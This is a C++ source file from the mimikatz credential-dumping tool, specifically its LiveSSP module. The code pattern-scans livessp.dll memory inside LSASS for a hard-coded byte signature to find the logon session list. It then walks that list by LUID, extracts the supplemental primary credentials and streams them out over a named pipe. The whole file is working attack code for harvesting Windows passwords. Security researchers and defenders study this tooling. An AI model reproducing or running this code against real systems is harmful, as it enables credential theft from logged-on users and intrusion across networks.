/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/
	This file  : http://creativecommons.org/licenses/by/3.0/
*/
#include "livessp.h"

PKIWI_LIVESSP_LIST_ENTRY LiveGlobalLogonSessionList = NULL;

bool searchLiveGlobalLogonSessionList()
{
#ifdef _M_X64
	BYTE PTRN_WALL_LiveUpdatePasswordForLogonSessions[]	= {0x48, 0x83, 0x65, 0xdf, 0x00, 0x48, 0x83, 0x65, 0xef, 0x00, 0x48, 0x83, 0x65, 0xe7, 0x00};
#elif defined _M_IX86
	BYTE PTRN_WALL_LiveUpdatePasswordForLogonSessions[]	= {0x89, 0x5d, 0xdc, 0x89, 0x5d, 0xe4, 0x89, 0x5d, 0xe0};
#endif
	LONG OFFS_WALL_LiveUpdatePasswordForLogonSessions	= -(5 + 4);

	if(!LiveGlobalLogonSessionList)
		mod_memory::genericPatternSearch(reinterpret_cast<PBYTE *>(&LiveGlobalLogonSessionList), L"livessp", PTRN_WALL_LiveUpdatePasswordForLogonSessions, sizeof(PTRN_WALL_LiveUpdatePasswordForLogonSessions), OFFS_WALL_LiveUpdatePasswordForLogonSessions);
	
	return (searchLSAFuncs() && LiveGlobalLogonSessionList);
}

__kextdll bool __cdecl getLiveSSP(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	vector<pair<PFN_ENUM_BY_LUID, wstring>> monProvider;
	monProvider.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getLiveSSPLogonData, wstring(L"livessp")));
	return getLogonData(monPipe, mesArguments, &monProvider);
}

__kextdll bool __cdecl getLiveSSPFunctions(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	wostringstream monStream;
	monStream << L"** livessp.dll/lsasrv.dll ** ; Research Status : " << (searchLiveGlobalLogonSessionList() ? L"OK :)" : L"KO :(") << endl << endl <<
		L"@LiveGlobalLogonSessionList = " << LiveGlobalLogonSessionList << endl <<
		L"@LsaUnprotectMemory         = " << SeckPkgFunctionTable->LsaUnprotectMemory << endl;
	return sendTo(monPipe, monStream.str());
}

bool WINAPI getLiveSSPLogonData(__in PLUID logId, __in mod_pipe * monPipe, __in bool justSecurity)
{
	wostringstream maReponse;
	if(searchLiveGlobalLogonSessionList())
	{
		PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
		if(PKIWI_LIVESSP_LIST_ENTRY pLogSession = reinterpret_cast<PKIWI_LIVESSP_LIST_ENTRY>(getPtrFromLinkedListByLuid(reinterpret_cast<PLIST_ENTRY>(LiveGlobalLogonSessionList), FIELD_OFFSET(KIWI_LIVESSP_LIST_ENTRY, LocallyUniqueIdentifier), logId)))
		{
			if(pLogSession->suppCreds && pLogSession->suppCreds->isSupp)
			{
				mesCreds = &pLogSession->suppCreds->credentials;
			}
			else maReponse << L"n.s. (SuppCred KO) / ";
		}
		genericCredsToStream(&maReponse, mesCreds, justSecurity);
	}
	else maReponse << L"n.a. (livessp KO)";

	return sendTo(monPipe, maReponse.str());
}